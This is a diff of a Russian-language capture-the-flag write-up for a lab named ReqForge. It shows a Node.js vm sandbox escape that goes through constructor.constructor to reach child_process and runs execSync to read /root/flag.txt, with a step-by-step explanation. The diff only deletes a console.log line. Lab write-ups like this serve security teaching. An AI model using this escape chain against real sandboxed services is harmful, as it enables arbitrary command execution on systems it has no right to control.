@@ -125,14 +125,12 @@ const findResult = outside.process.mainModule.require('child_process')
 outside = helpers.constructor.constructor('return this')()
 const flag = outside.process.mainModule.require('child_process')
     .execSync('cat /root/flag.txt').toString()
-console.log(flag)
 ```
 
 **Разбор эксплоита:**
 - Цепочка побега (`outside`) и получение `child_process` — те же.
 - `.execSync('cat /root/flag.txt')` — выполняет системную команду чтения файла по известному пути.
 - `.toString()` — возвращает содержимое файла в виде строки.
-- `console.log(flag)` — выводит флаг в панель Script Output.
 
 ![Получение флага](https://github.com/koo-noo/my-write-up/blob/main/labs/labs.hackadvisor/Lab%20129%20%E2%80%94%20ReqForge%20%E2%80%94%20RCE%20via%20VM%20Sandbox%20Escape/images/%D0%BE%D1%82%D1%87%D0%B5%D1%82_10.JPG)
 
